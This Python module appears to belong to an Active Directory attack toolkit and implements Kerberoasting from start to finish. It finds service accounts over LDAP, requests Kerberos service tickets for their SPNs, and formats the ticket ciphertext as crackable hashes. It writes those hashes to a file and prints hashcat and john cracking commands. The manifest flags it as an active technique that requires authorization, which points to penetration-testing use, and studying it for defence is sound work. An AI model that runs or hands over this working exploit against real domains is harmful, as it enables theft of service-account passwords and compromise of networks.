"""Kerberoasting — request TGS for SPN accounts and extract hashes for offline cracking."""


import os
import sys
from datetime import datetime, timezone, UTC
from typing import Any

from adxpl.core.credential import ADCredential


MANIFEST = {
    "capability_id": "adxpl.attack.kerberoast.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["kerberos_tgs_requests"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1558.003"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)

    print(f"[*] Kerberoasting → {args.target} ({args.domain})")

    if not cred.has_password and not cred.has_hash:
        print("[!] Kerberoasting requires valid domain credentials", file=sys.stderr)
        return 1

    try:
        from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
        from impacket.krb5 import constants
        from impacket.krb5.types import Principal, KerberosTime
        from impacket.ntlm import compute_lmhash, compute_nthash
    except ImportError:
        print("[!] impacket not installed: pip install impacket", file=sys.stderr)
        return 1

    from adxpl.core.ldap_session import connect, get_base_dn
    import ldap3

    conn = connect(args.target, cred)
    base_dn = get_base_dn(args.domain)

    conn.search(
        base_dn,
        "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
        attributes=["sAMAccountName", "servicePrincipalName", "adminCount"],
        search_scope=ldap3.SUBTREE,
        paged_size=1000,
    )

    targets = []
    for entry in conn.entries:
        import json
        data = json.loads(entry.entry_to_json())
        attrs = data.get("attributes", {})
        sam = attrs.get("sAMAccountName", "")
        if isinstance(sam, list):
            sam = sam[0] if sam else ""
        spns = attrs.get("servicePrincipalName", [])
        if isinstance(spns, str):
            spns = [spns]
        admin = bool(attrs.get("adminCount"))
        targets.append({"username": sam, "spns": spns, "admin": admin})

    if not targets:
        print("[-] No Kerberoastable accounts found")
        return 0

    print(f"[+] Found {len(targets)} Kerberoastable accounts")

    user_name = Principal(cred.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

    if cred.has_password:
        lm_hash = compute_lmhash(cred.password)
        nt_hash = compute_nthash(cred.password)
    else:
        lm_hash = bytes.fromhex(cred.lm_hash) if cred.lm_hash else b"\x00" * 16
        nt_hash = bytes.fromhex(cred.nt_hash)

    try:
        tgt, cipher, old_session_key, session_key = getKerberosTGT(
            user_name, cred.password or "", args.domain,
            lm_hash, nt_hash, None, args.target,
        )
    except Exception as exc:
        print(f"[!] TGT request failed: {exc}", file=sys.stderr)
        return 1

    hashes = []
    for target_info in targets:
        for spn in target_info["spns"]:
            try:
                server_name = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
                tgs, tgs_cipher, _, _ = getKerberosTGS(
                    server_name, args.domain, args.target,
                    tgt, cipher, session_key,
                )
                hash_entry = _extract_hash(tgs, tgs_cipher, target_info["username"], spn, args.domain)
                if hash_entry:
                    hashes.append(hash_entry)
                    tag = " [ADMIN]" if target_info["admin"] else ""
                    print(f"  [+] {target_info['username']}{tag} → {spn}")
                break
            except Exception as exc:
                print(f"  [-] {spn}: {exc}", file=sys.stderr)

    if hashes:
        os.makedirs(args.output, exist_ok=True)
        ts = datetime.now(UTC).strftime("%Y%m%d_%H%M%S")
        out_path = os.path.join(args.output, f"kerberoast_{ts}.txt")
        with open(out_path, "w") as fh:
            fh.write("\n".join(hashes))
        print(f"\n[+] {len(hashes)} TGS hashes written to {out_path}")
        print("[*] Crack with: hashcat -m 13100 or john --format=krb5tgs")
    else:
        print("[-] No hashes obtained")
    return 0


def _extract_hash(tgs: bytes, cipher: Any, username: str, spn: str, domain: str) -> str | None:
    from impacket.krb5.crypto import Key
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import TGS_REP
    from pyasn1.codec.der import decoder

    try:
        tgs_rep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
        enc_part = tgs_rep["ticket"]["enc-part"]
        etype = int(enc_part["etype"])
        cipher_data = bytes(enc_part["cipher"])

        if etype == 23:
            return f"$krb5tgs$23$*{username}${domain}${spn}*${cipher_data[:16].hex()}${cipher_data[16:].hex()}"
        elif etype == 17:
            return f"$krb5tgs$17${username}${domain}$*{spn}*${cipher_data.hex()}"
        elif etype == 18:
            return f"$krb5tgs$18${username}${domain}$*{spn}*${cipher_data.hex()}"
    except Exception:
        pass
    return None
